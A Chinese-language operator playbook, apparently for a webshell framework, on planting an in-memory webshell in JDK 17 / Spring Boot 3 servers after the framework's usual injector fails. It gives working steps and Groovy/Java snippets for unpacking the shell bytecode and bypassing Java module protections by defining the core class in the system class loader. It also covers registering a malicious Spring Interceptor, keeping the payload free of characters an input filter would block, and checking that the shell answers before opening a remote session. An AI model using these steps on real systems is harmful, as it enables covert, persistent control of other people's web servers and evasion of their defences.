# JDK 17 / Spring Boot 3 回退投递

生成器 Injector 在这类靶上会失败，原因同时存在：

- `ClassLoader.defineClass` + `setAccessible` 被 `java.base` 模块封死
- `byPassJavaModule` 依赖 `Unsafe.theUnsafe.setAccessible`，JDK 17 上常直接失败
- 嵌入式 Tomcat 9+ 线程名是 `Catalina-utility-*` / `http-nio-*`，Filter 注入找不到 `ContainerBackgroundProcessor`
- 默认 `servletNamespace=auto` 解析成 javax，Boot 3 只有 jakarta

不要继续改 Filter。走 Spring Interceptor，并且不要执行 Injector 的 `getShell()`。

## 1. 拆制品

从 `leo_generate_memory_shell` 得到 Injector 类字节码（`GroovyClassLoaderDefiner` 的 Base64 内容）。常量池里：

- `shellClassName`：Interceptor 类名
- `shellClass`：gzip + Base64 的 Interceptor 字节码
- Interceptor 再内嵌 `coreClassName` / `coreClass`（gzip + Base64）

Interceptor 与 Core 二进制名相同，但必须进不同 ClassLoader：

- Core：`ClassLoader.getSystemClassLoader()`（AppClassLoader），供 `Class.forName(coreClassName, true, SystemClassLoader)` 找到
- Interceptor：`GroovyClassLoader(TCCL)`，再 `add` 进 `adaptedInterceptors`

## 2. jakarta 改写

若探测只有 `jakarta.servlet`，改写 Interceptor 常量池 UTF8：

- `javax/servlet` → `jakarta/servlet`
- `javax.servlet` → `jakarta.servlet`

不要改 `javax/crypto`、`javax/net`。Core 一般不引用 servlet。

## 3. 把 Core 打进 AppClassLoader

`MethodHandles.Lookup.defineClass` 要求与 lookup 类同包。Spring Boot 3 的

`org.springframework.boot.loader.launch.Launcher`

在 AppClassLoader 上。把 Core 的内部名改到该包，例如 `org.springframework.boot.loader.launch.ArchiveMetadataCache`，并同步改 Interceptor 的 `coreClassName` 字符串。

用反射取 Lookup，避免 Groovy 把 `MethodHandles.lookup` 解析成内部类：

```
mhClass.getDeclaredMethod("lookup", new Class[0]).invoke(null, new Object[0])
mhClass.getDeclaredMethod("privateLookupIn", Class.class, lookupCls).invoke(null, launcherClass, lookup)
priv.defineClass(coreBytes)
```

`privateLookupIn` 成功后 `lookupClass` 应是 `Launcher`，loader 应是 `ClassLoaders$AppClassLoader`。用 `Class.forName(newCoreName, false, ClassLoader.getSystemClassLoader())` 复核。

## 4. 挂 Interceptor

```
gcl = new GroovyClassLoader(Thread.currentThread().getContextClassLoader())
shell = gcl.defineClass(interceptorName, interceptorBytes).newInstance()
ctx = RequestContextHolder.getRequestAttributes().getRequest().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT")
mapping = ctx.getBean("requestMappingHandlerMapping")
field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors")
field.setAccessible(true);
list = field.get(mapping)
list.add(0, shell)
```

整段 Groovy 仍须满足：无 `=` / `+` / `'`。`setAccessible(true)` 后加分号，再写下一个闭包。

## 5. 验证

对同一 URL 带 `headerName: headerValue` POST。响应应变为密文，不再是原业务 JSON。然后再 `leo_add_puppet` / `leo_open_session`。

Tomcat Filter 回退只在 Interceptor 验证失败且确认不是嵌入式 Tomcat 时考虑。Nginx 前面还在时，可再试 WebSocket injector；先不要把它当默认路径。
